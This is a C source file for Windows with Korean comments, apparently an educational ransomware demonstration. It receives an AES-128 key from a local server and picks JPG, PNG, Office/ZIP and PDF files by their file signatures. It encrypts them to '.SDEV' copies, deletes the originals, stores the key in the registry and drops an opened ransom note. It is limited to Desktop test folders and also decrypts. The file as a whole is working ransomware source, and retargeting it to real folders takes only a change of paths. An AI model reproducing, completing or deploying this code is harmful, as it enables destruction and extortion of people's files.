#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <winreg.h>
#include <string.h>
#include <locale.h>
#include <stdlib.h>
#include <time.h>
#include "aes.h"
#include <shellapi.h>
#pragma comment(lib, "ws2_32")

#define KEY_SIZE    16
#define CHUNK_SIZE  40960   // 반드시 16의 배수

typedef struct Directorytarget {
    wchar_t addr[1000];
    wchar_t file[1000];
    wchar_t oex[1000];
} target;

//UserName을 불러오는 함수
wchar_t* getUserName() {
    static wchar_t buf[512];
    DWORD pcbBuffer = sizeof(buf) / sizeof(buf[0]);
    if (!GetUserNameW(buf, &pcbBuffer)) {
        printf("Failed to get user name.\n");
        return NULL;
    }
    return buf;
}

//AES-CBC는 16바이트 단위로만 암호화 되기 때문에
// 암호화 전 -> 부족한 바이트를 채워서 16의 배수로 만든다.
// 암호화 후 -> 마지막에 넣어둔 패딩을 제거한다.
//이 과정을 고려하지 않으면, 복호화 과정 로직에서 깨져서 안 열린다.

// PKCS7 패딩 추가 → 패딩 후 전체 크기 반환 (실패 시 0)
//buf : 파일 데이터를 담고 있는 버퍼, dataLen : 실제 원본 데이터 길이, bufSize : 버퍼 전체 크기(패딩 넣을 공간 포함)
//applyPKCS7Padding : 암호화 전에 패딩 추가해서 데이터 길이를 16의 배수로 맞추는 함수
static DWORD applyPKCS7Padding(BYTE* buf, DWORD dataLen, DWORD bufSize) {
    DWORD padLen = 16 - (dataLen % 16); //AES 블록 크기가 16바이트니까 16 배수가 아니면 부족한 만큼 채움.
    //PKCS#7의 규칙
    if (dataLen + padLen > bufSize) return 0;
    for (DWORD i = 0; i < padLen; i++)
        buf[dataLen + i] = (BYTE)padLen;
    //패딩 바이트를 실제로 뒤에 채움.
    return dataLen + padLen; //패딩까지 포함한 새로운 전체 길이 반환
}

// PKCS7 패딩 제거 → 실제 데이터 크기 반환
//removePKCS7Padding = 복호화 후 원래 길이 복원
static DWORD removePKCS7Padding(BYTE* buf, DWORD dataLen) {
    if (dataLen == 0) return 0; //빈 데이터면 제거할 것도 없음.

    BYTE padLen = buf[dataLen - 1];//PKCS#7 = 마지막 바이트 값 = 패딩 길이
    if (padLen == 0 || padLen > 16) return dataLen; // 패딩 값이 이상하면 그냥 원본 길이 그대로 반환

    for (DWORD i = dataLen - padLen; i < dataLen; i++)
        if (buf[i] != padLen) return dataLen;
    //마지막 padLen 바이트가 전부 같은 값인지 검증
    return dataLen - padLen; // 정상 패딩이면 그만큼 잘라내서 실제 원본 데이터 길이 반환
}

// -----------------------------------------------------------------------
// 암호화: srcPath → outPath (.원본확장자.SDEV)
// 원본 읽고 패딩 추가 AES-CBC 암호화, .변경될 확장자 저장
// -----------------------------------------------------------------------
static void encryptFile(const wchar_t* srcPath, const wchar_t* outPath, const unsigned char* key) {
    uint8_t iv[] = {
        0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
        0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f
    };

    HANDLE hSrc = CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) {
        wprintf(L"[ENC] Cannot open: %s\n", srcPath);
        return;
    }
    HANDLE hDst = CreateFileW(outPath, GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) {
        wprintf(L"[ENC] Cannot create: %s\n", outPath);
        CloseHandle(hSrc);
        return;
    }

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);   // CBC: 파일당 한 번만 초기화

    BYTE buf[CHUNK_SIZE + 16];
    DWORD bytesRead = 0, bytesWritten = 0;
    BOOL isLastChunk = FALSE;

    while (!isLastChunk) {
        if (!ReadFile(hSrc, buf, CHUNK_SIZE, &bytesRead, NULL)) break;

        if (bytesRead < CHUNK_SIZE) {
            // 마지막 청크: PKCS7 패딩 적용
            isLastChunk = TRUE;
            DWORD paddedLen = applyPKCS7Padding(buf, bytesRead, sizeof(buf));
            if (paddedLen == 0) break;
            AES_CBC_encrypt_buffer(&ctx, buf, paddedLen);
            WriteFile(hDst, buf, paddedLen, &bytesWritten, NULL);
        } else {
            // 중간 청크: CHUNK_SIZE는 16의 배수이므로 그대로 암호화
            AES_CBC_encrypt_buffer(&ctx, buf, bytesRead);
            WriteFile(hDst, buf, bytesRead, &bytesWritten, NULL);
        }
    }

    CloseHandle(hSrc);
    CloseHandle(hDst);
    wprintf(L"[ENC] %s\n  -> %s\n", srcPath, outPath);
}

// -----------------------------------------------------------------------
// 복호화: srcPath (.원본확장자.SDEV) → outPath (원본 파일명 그대로)
// 변경된 확장자를 읽고 AES-CBC 복호화, PKCS#7 패딩 제거, 원래 크기로 저장
// iv=0x000102030405060708090A0B0C0D0E0F로 설정해서 암호화 진행
// -----------------------------------------------------------------------
static void decryptFile(const wchar_t* srcPath, const wchar_t* outPath, const unsigned char* key) {
    uint8_t iv[] = {
        0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
        0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f
    };

    HANDLE hSrc = CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) {
        wprintf(L"[DEC] Cannot open: %s\n", srcPath);
        return;
    }
    HANDLE hDst = CreateFileW(outPath, GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) {
        wprintf(L"[DEC] Cannot create: %s\n", outPath);
        CloseHandle(hSrc);
        return;
    }

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);   // CBC: 파일당 한 번만 초기화

    // 마지막 청크에서만 패딩 제거 → 이전 청크를 버퍼링하면서 처리
    BYTE buf[CHUNK_SIZE];
    BYTE prevChunk[CHUNK_SIZE];
    DWORD bytesRead = 0, prevSize = 0, bytesWritten = 0;
    BOOL first = TRUE;

    while (1) {
        if (!ReadFile(hSrc, buf, CHUNK_SIZE, &bytesRead, NULL) || bytesRead == 0) {
            // 파일 끝: prevChunk가 마지막 청크 → 패딩 제거 후 기록
            if (!first && prevSize > 0) {
                AES_CBC_decrypt_buffer(&ctx, prevChunk, prevSize);
                DWORD realLen = removePKCS7Padding(prevChunk, prevSize);
                WriteFile(hDst, prevChunk, realLen, &bytesWritten, NULL);
            }
            break;
        }

        if (!first) {
            // 이전 청크는 마지막이 아님 → 패딩 없이 복호화 후 쓰기
            AES_CBC_decrypt_buffer(&ctx, prevChunk, prevSize);
            WriteFile(hDst, prevChunk, prevSize, &bytesWritten, NULL);
        }

        memcpy(prevChunk, buf, bytesRead);
        prevSize = bytesRead;
        first = FALSE;
    }

    CloseHandle(hSrc);
    CloseHandle(hDst);
    wprintf(L"[DEC] %s\n  -> %s\n", srcPath, outPath);
}

// -----------------------------------------------------------------------
// 암호화 대상 디렉터리 순회
// 암호화 후 파일명: 원본파일명.SDEV
// -----------------------------------------------------------------------
void EncryptTarget(target* t, unsigned char* key) {
    wchar_t searchPath[1000];
    wcscpy(searchPath, t->addr);
    wcscat(searchPath, L"*");

    WIN32_FIND_DATAW FindData;
    HANDLE hFind = FindFirstFileW(searchPath, &FindData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"[ENC] No files in: %s\n", t->addr);
        return;
    }

    do {
        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        // 이미 .SDEV 파일이면 스킵
        wchar_t* dotPos = wcsrchr(FindData.cFileName, L'.');
        if (dotPos && wcscmp(dotPos, L".SDEV") == 0) continue;

        wchar_t filePath[1000];
        wcscpy(filePath, t->addr);
        wcscat(filePath, FindData.cFileName);

        // 시그니처 확인
        HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        BYTE sig[8] = { 0 };
        DWORD sigRead = 0;
        ReadFile(hFile, sig, sizeof(sig), &sigRead, NULL);
        CloseHandle(hFile);

        BOOL isTarget = FALSE;

        // JPG/JPEG: FF D8 FF E0
        if (sig[0] == 0xFF && sig[1] == 0xD8 && sig[2] == 0xFF && sig[3] == 0xE0) {
            wprintf(L"[ENC] JPG  : %s\n", FindData.cFileName);
            isTarget = TRUE;
        }
        // PNG: 89 50 4E 47 0D 0A 1A 0A
        else if (sig[0] == 0x89 && sig[1] == 0x50 && sig[2] == 0x4E && sig[3] == 0x47 &&
                 sig[4] == 0x0D && sig[5] == 0x0A && sig[6] == 0x1A && sig[7] == 0x0A) {
            wprintf(L"[ENC] PNG  : %s\n", FindData.cFileName);
            isTarget = TRUE;
        }
        // ZIP 계열 (docx / pptx / xlsx / zip): 50 4B 03 04
        else if (sig[0] == 0x50 && sig[1] == 0x4B && sig[2] == 0x03 && sig[3] == 0x04) {
            wprintf(L"[ENC] ZIP계열(docx/pptx/xlsx/zip): %s\n", FindData.cFileName);
            isTarget = TRUE;
        }
        // PDF : 25 50 44 46
        else if (sig[0] == 0x25 && sig[1] == 0x50 && sig[2] == 0x44 && sig[3] == 0x46) {
            wprintf(L"[ENC] PDF : %s\n", FindData.cFileName);
            isTarget = TRUE;
        }

        if (!isTarget) continue;

        // 출력 경로: 원본파일명 + ".SDEV"  (확장자를 대체하는 게 아니라 뒤에 추가)
        wchar_t outPath[1000];
        wcscpy(outPath, filePath);
        wcscat(outPath, L".SDEV");

        encryptFile(filePath, outPath, key);
        DeleteFileW(filePath);   // 원본 삭제

    } while (FindNextFileW(hFind, &FindData));

    FindClose(hFind);
}

// -----------------------------------------------------------------------
// 복호화 대상 디렉터리 순회
// .SDEV 제거 → 원본 파일명 복원  (예: photo.png.SDEV → photo.png)
// -----------------------------------------------------------------------
void DecryptTarget(target* t, unsigned char* key) {
    wchar_t searchPath[1000];
    wcscpy(searchPath, t->addr);
    wcscat(searchPath, L"*");

    WIN32_FIND_DATAW FindData;
    HANDLE hFind = FindFirstFileW(searchPath, &FindData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"[DEC] No files in: %s\n", t->addr);
        return;
    }

    // 복호화 결과는 test{n} 서브디렉터리에 저장
    wchar_t newDir[1000];
    wcscpy(newDir, t->addr);
    wcscat(newDir, L"test");
    wchar_t index[4];
    wsprintf(index, L"%d", (t->addr[wcslen(t->addr) - 2] - L'0'));
    wcscat(newDir, index);
    wcscat(newDir, L"\\");
    CreateDirectoryW(newDir, NULL);

    do {
        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        // .SDEV 파일만 처리
        wchar_t* sdevPos = wcsrchr(FindData.cFileName, L'.');
        if (!sdevPos || wcscmp(sdevPos, L".SDEV") != 0) continue;

        wchar_t srcPath[1000];
        wcscpy(srcPath, t->addr);
        wcscat(srcPath, FindData.cFileName);

        // 출력 파일명: .SDEV 제거하면 원본 파일명 그대로
        wchar_t outPath[1000];
        wcscpy(outPath, newDir);
        wcscat(outPath, FindData.cFileName);

        // 끝의 ".SDEV" 제거
        wchar_t* dot = wcsrchr(outPath, L'.');
        if (dot) *dot = L'\0';   // ".SDEV" 잘라내기

        decryptFile(srcPath, outPath, key);

    } while (FindNextFileW(hFind, &FindData));

    FindClose(hFind);
}

// -----------------------------------------------------------------------
// main
// -----------------------------------------------------------------------
int main() {
    setlocale(LC_ALL, "Korean");
    _wsetlocale(LC_ALL, L"Korean");

    wchar_t* uname = getUserName();
    if (!uname) return 1;

    target tt[4] = { 0 };
    wchar_t prefix[200] = L"C:\\Users\\";
    wcscat(prefix, uname);

    for (int i = 0; i < 4; i++)
        wcscpy_s(tt[i].addr, 1000, prefix);

    wcscat(tt[0].addr, L"\\바탕 화면\\RansomwareTest1\\");
    wcscat(tt[1].addr, L"\\바탕 화면\\RansomwareTest2\\");
    wcscat(tt[2].addr, L"\\바탕 화면\\RansomwareTest3\\");
    wcscat(tt[3].addr, L"\\바탕 화면\\RansomwareTest4\\");

    // 테스트 서브디렉터리 생성
    for (int i = 0; i < 4; i++) {
        CreateDirectoryW(tt[i].addr, NULL);
        wchar_t subDir[1000];
        wcscpy(subDir, tt[i].addr);
        wchar_t idx[4];
        wsprintf(idx, L"%d", i + 1);
        wcscat(subDir, L"test");
        wcscat(subDir, idx);
        CreateDirectoryW(subDir, NULL);
    }

    // ── Winsock / 서버 연결 ──────────────────────────────────────────────
    WSADATA wsaData = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed.\n");
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        fprintf(stderr, "Failed to create socket\n");
        WSACleanup();
        return 1;
    }

    SOCKADDR_IN serverInfo = { 0 };
    serverInfo.sin_family = AF_INET;
    serverInfo.sin_port = htons(12345);
    serverInfo.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");

    if (connect(clientSocket, (SOCKADDR*)&serverInfo, sizeof(serverInfo)) == SOCKET_ERROR) {
        fprintf(stderr, "Failed to connect to server\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // 16바이트 키 수신
    unsigned char randomKey[KEY_SIZE];
    int bytesReceived = recv(clientSocket, (char*)randomKey, sizeof(randomKey), 0);
    if (bytesReceived != KEY_SIZE) {
        fprintf(stderr, "Failed to receive key (got %d bytes)\n", bytesReceived);
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    closesocket(clientSocket);
    WSACleanup();

    printf("Key received: ");
    for (int i = 0; i < KEY_SIZE; i++) printf("%02x ", randomKey[i]);
    printf("\n");

    //암호화 
    printf("\n========== ENCRYPT ==========\n");
    for (int i = 0; i < 4; i++)
        EncryptTarget(&tt[i], randomKey);

    // 레지스트리에 키 저장
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, L"KEY", 0, REG_BINARY, randomKey, KEY_SIZE) == ERROR_SUCCESS)
            printf("\n[REG] Key saved to registry.\n");
        else
            printf("\n[REG] Key save failed.\n");
        RegCloseKey(hKey);
    }

    //복호화 
    printf("\n========== DECRYPT ==========\n");
    for (int i = 0; i < 4; i++)
        DecryptTarget(&tt[i], randomKey);


    // 랜섬노트 파일 생성 및 열기
    wchar_t notePath[1000] = L"C:\\Users\\";
    wcscat(notePath, uname);
    wcscat(notePath, L"\\바탕 화면\\ransomenote.txt");

    // 랜섬노트 파일 생성
    HANDLE hNote = CreateFileW(notePath, GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNote != INVALID_HANDLE_VALUE) {
        const char* noteContent =
            "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\r\n"
            "========================================\r\n\r\n"
            "All your important files have been encrypted with AES-128.\r\n"
            "To recover your files, you must obtain the decryption key.\r\n\r\n"
            "Your unique KEY has been stored. Do not delete or modify any .SDEV files.\r\n\r\n"
            "========================================\r\n"
            "This is an educational demonstration only.\r\n"
            "========================================\r\n";
        DWORD written;
        WriteFile(hNote, noteContent, (DWORD)strlen(noteContent), &written, NULL);
        CloseHandle(hNote);
    }

    // 랜섬노트 열기
    HINSTANCE result = ShellExecuteW(NULL, L"open", notePath, NULL, NULL, SW_SHOWNORMAL);
    if ((INT_PTR)result <= 32)
        printf("[NOTE] Error opening ransomnote: %lu\n", GetLastError());
    return 0;
}
